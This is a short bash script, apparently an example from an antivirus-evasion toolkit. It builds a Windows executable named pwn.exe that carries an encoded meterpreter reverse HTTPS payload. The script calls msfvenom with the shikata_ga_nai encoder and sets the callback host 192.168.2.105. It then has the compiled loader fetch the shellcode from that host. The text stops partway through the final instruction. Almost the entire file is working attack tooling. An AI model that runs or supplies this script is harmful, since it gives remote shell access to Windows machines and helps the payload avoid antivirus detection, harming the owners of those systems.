#!/bin/bash          
# simple example script for building the .exe file
. build/global_win32.sh
# make meterpreter reverse payload, encoded with shikata_ga_nai
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.105 lport=443 -e x86/shikata_ga_nai -i 2 -f c -a x86 --platform Windows > sc.txt
# format the shellcode for make_avet
./format.sh sc.txt > scclean.txt && rm sc.txt
# call make_avet, compile 
./make_avet -E -u 192.168.2.105/scclean.txt -p
$win32_compiler -o pwn.exe avet.c
# cleanup
echo " " > defs.h
# now copy scclean.txt to your web root and start 
